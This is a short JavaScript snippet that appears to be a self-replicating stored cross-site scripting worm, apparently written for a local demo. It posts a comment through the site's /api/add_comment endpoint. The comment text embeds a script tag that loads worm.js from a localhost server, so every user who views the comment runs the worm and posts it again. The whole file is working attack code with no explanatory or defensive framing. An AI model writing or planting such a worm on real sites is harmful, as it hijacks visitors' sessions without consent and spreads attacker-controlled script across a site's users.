var commentText = '<script src="http://localhost:3001/worm.js"></script>';
// 判断当前用户是否发过哈
window.wormFlag = window.wormFlag || {};

$.ajax({    
  type:'post',        
  url:'/api/add_comment',    
  data: {
    text: 'badyboy is cool' + commentText,
    date: +Date.now()
  },   
}); 

